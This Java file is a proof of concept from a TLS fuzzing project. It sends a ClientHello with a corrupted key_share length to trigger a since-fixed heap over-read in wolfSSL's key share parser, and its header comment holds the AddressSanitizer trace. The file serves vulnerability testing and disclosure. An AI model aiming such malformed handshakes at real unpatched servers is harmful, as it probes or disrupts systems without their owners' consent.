package com.gypsyengineer.tlsbunny.vendor.test.tls13.wolfssl.poc;

import com.gypsyengineer.tlsbunny.fuzzer.FuzzedVector;
import com.gypsyengineer.tlsbunny.output.Output;
import com.gypsyengineer.tlsbunny.tls.Struct;
import com.gypsyengineer.tlsbunny.tls.Vector;
import com.gypsyengineer.tlsbunny.tls13.client.Client;
import com.gypsyengineer.tlsbunny.tls13.client.HttpsClient;
import com.gypsyengineer.tlsbunny.tls13.fuzzer.DeepHandshakeFuzzer;
import com.gypsyengineer.tlsbunny.tls13.fuzzer.FuzzyStructFactory;
import com.gypsyengineer.tlsbunny.tls13.struct.KeyShareEntry;
import com.gypsyengineer.tlsbunny.tls13.struct.NamedGroup;
import com.gypsyengineer.tlsbunny.tls13.struct.StructFactory;
import com.gypsyengineer.tlsbunny.tls13.utils.FuzzerConfig;
import com.gypsyengineer.tlsbunny.utils.Config;
import com.gypsyengineer.tlsbunny.utils.SystemPropertiesConfig;

import java.io.IOException;

import static com.gypsyengineer.tlsbunny.fuzzer.BitFlipFuzzer.newBitFlipFuzzer;
import static com.gypsyengineer.tlsbunny.output.Output.standard;
import static com.gypsyengineer.tlsbunny.tls13.client.HttpsClient.httpsClient;
import static com.gypsyengineer.tlsbunny.tls13.fuzzer.DeepHandshakeFuzzer.deepHandshakeFuzzer;
import static com.gypsyengineer.tlsbunny.tls13.fuzzer.DeepHandshakeFuzzyClient.deepHandshakeFuzzyClient;
import static com.gypsyengineer.tlsbunny.tls13.fuzzer.MultiConfigClient.multiConfigClient;
import static com.gypsyengineer.tlsbunny.utils.HexDump.printHexDiff;
import static com.gypsyengineer.tlsbunny.utils.WhatTheHell.whatTheHell;

/**
 * TLSX_KeyShareEntry_Parse() function might read out of the "input" buffer
 * while parsing key_share extensions from a malformed ClientHello message.
 * It doesn't seem to be possible to read much.
 *
 * Fixed in https://github.com/wolfSSL/wolfssl/pull/2082
 *
 * Here is a stack trace by ASan:
 *
 * ==5064==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60e00000dff1 at pc 0x7fb0fba8c935 bp 0x7ffc62c8c020 sp 0x7ffc62c8b7c8
 * READ of size 67 at 0x60e00000dff1 thread T0
 * #0 0x7fb0fba8c934 in __asan_memcpy (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x8c934)
 * #1 0x7fb0fb6fbbbe in TLSX_KeyShareEntry_Parse src/tls.c:6557
 * #2 0x7fb0fb6fc3f6 in TLSX_KeyShare_Parse src/tls.c:6672
 * #3 0x7fb0fb7066f6 in TLSX_Parse src/tls.c:9914
 * #4 0x7fb0fb710ead in DoTls13ClientHello src/tls13.c:3927
 * #5 0x7fb0fb71c166 in DoTls13HandShakeMsgType src/tls13.c:7166
 * #6 0x7fb0fb71d05b in DoTls13HandShakeMsg src/tls13.c:7369
 * #7 0x7fb0fb6a5c80 in ProcessReply src/internal.c:13221
 * #8 0x7fb0fb6e7fe5 in wolfSSL_accept src/ssl.c:9507
 * #9 0x4094b1 in server_test examples/server/server.c:2047
 * #10 0x409ebb in main examples/server/server.c:2348
 * #11 0x7fb0fafa482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
 * #12 0x402dd8 in _start (/home/artem/projects/tlsbunny/ws/wolfssl/wolfssl/examples/server/.libs/lt-server+0x402dd8)
 *
 * 0x60e00000dff1 is located 0 bytes to the right of 145-byte region [0x60e00000df60,0x60e00000dff1)
 * allocated by thread T0 here:
 * #0 0x7fb0fba98602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
 * #1 0x7fb0fb630abc in wolfSSL_Malloc wolfcrypt/src/memory.c:127
 * #2 0x7fb0fb6922cc in GrowInputBuffer src/internal.c:7038
 * #3 0x7fb0fb6a3834 in GetInputData src/internal.c:12704
 * #4 0x7fb0fb6a49ad in ProcessReply src/internal.c:12997
 * #5 0x7fb0fb6e7fe5 in wolfSSL_accept src/ssl.c:9507
 * #6 0x4094b1 in server_test examples/server/server.c:2047
 * #7 0x409ebb in main examples/server/server.c:2348
 * #8 0x7fb0fafa482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
 *
 * SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 __asan_memcpy
 * Shadow bytes around the buggy address:
 * 0x0c1c7fff9ba0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9bb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9bc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9bd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9be0: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00
 * =>0x0c1c7fff9bf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00[01]fa
 * 0x0c1c7fff9c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9c10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9c20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9c30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * 0x0c1c7fff9c40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
 * Shadow byte legend (one shadow byte represents 8 application bytes):
 * Addressable: 00
 * Partially addressable: 01 02 03 04 05 06 07
 * Heap left redzone: fa
 * Heap right redzone: fb
 * Freed heap region: fd
 * Stack left redzone: f1
 * Stack mid redzone: f2
 * Stack right redzone: f3
 * Stack partial redzone: f4
 * Stack after return: f5
 * Stack use after scope: f8
 * Global redzone: f9
 * Global init order: f6
 * Poisoned by user: f7
 * Container overflow: fc
 * Array cookie: ac
 * Intra object redzone: bb
 * ASan internal: fe
 * ==5064==ABORTING
 */
public class KeyShareEntryHeapOverRead {

    public static void main(String[] args) throws Exception {
        try (Output output = Output.standardClient(); Client client = new HttpsClient()) {
            Config config = SystemPropertiesConfig.load();
            config.port(40101);

            client.set(new BadStructFactory(output))
                    .set(config)
                    .set(output)
                    .connect();
        }
    }

    private static class BadStructFactory extends FuzzyStructFactory<Object> {

        public BadStructFactory(Output output) {
            this(StructFactory.getDefault(), output);
        }

        public BadStructFactory(StructFactory factory, Output output) {
            super(factory, output);
        }

        @Override
        public KeyShareEntry createKeyShareEntry(NamedGroup group, byte[] bytes) {
            return fuzzKeyShareEntry(factory.createKeyShareEntry(group, bytes));
        }

        private KeyShareEntry fuzzKeyShareEntry(KeyShareEntry entry) {
            output.info("fuzz KeyShareEntry");
            try {
                Vector<Byte> key_exchange = entry.keyExchange();

                byte[] bytes = key_exchange.bytes();
                byte[] corrupted_bytes = bytes.clone();
                corrupted_bytes[bytes.length - 2] = 0;
                corrupted_bytes[bytes.length - 1] = (byte) 67;
                int corrupted_length = bytes.length - 4;
                FuzzedVector<Byte> corrupted_key_exchange = new FuzzedVector<>(
                        KeyShareEntry.key_exchange_length_bytes,
                        corrupted_length,
                        corrupted_bytes);
                diff("KeyShareEntry.key_exchange", key_exchange, corrupted_key_exchange);

                entry.keyExchange(corrupted_key_exchange);
                return entry;
            } catch (IOException e) {
                throw whatTheHell("could not fuzz KeyShareEntry", e);
            }
        }

        private void diff(String what, Struct original, Struct fuzzed) throws IOException {
            byte[] originalEncoding = original.encoding();
            byte[] fuzzedEncoding = fuzzed.encoding();

            output.info("%s (original):", what);
            output.increaseIndent();
            output.info("%s%n", printHexDiff(originalEncoding, fuzzedEncoding));
            output.decreaseIndent();
            output.info("%s (fuzzed):", what);
            output.increaseIndent();
            output.info("%s%n", printHexDiff(fuzzedEncoding, originalEncoding));
            output.decreaseIndent();
        }

        @Override
        public Object fuzz(Object object) {
            throw whatTheHell("you should not be here!");
        }
    }

    public static void runFuzzer() throws Exception {
        try (Output output = Output.standard()) {
            FuzzerConfig config = new FuzzerConfig(SystemPropertiesConfig.load());
            DeepHandshakeFuzzer deepHandshakeFuzzer = deepHandshakeFuzzer();
            deepHandshakeFuzzer.fuzzer(newBitFlipFuzzer());
            config.factory(deepHandshakeFuzzer);
            config.state("0:18:10:4:0:-1:0.01:0.02:1504");
            config.port(40101);
            config.total(1);

            multiConfigClient()
                    .from(deepHandshakeFuzzyClient().from(httpsClient()))
                    .set(output)
                    .configs(config)
                    .connect();
        }
    }
}
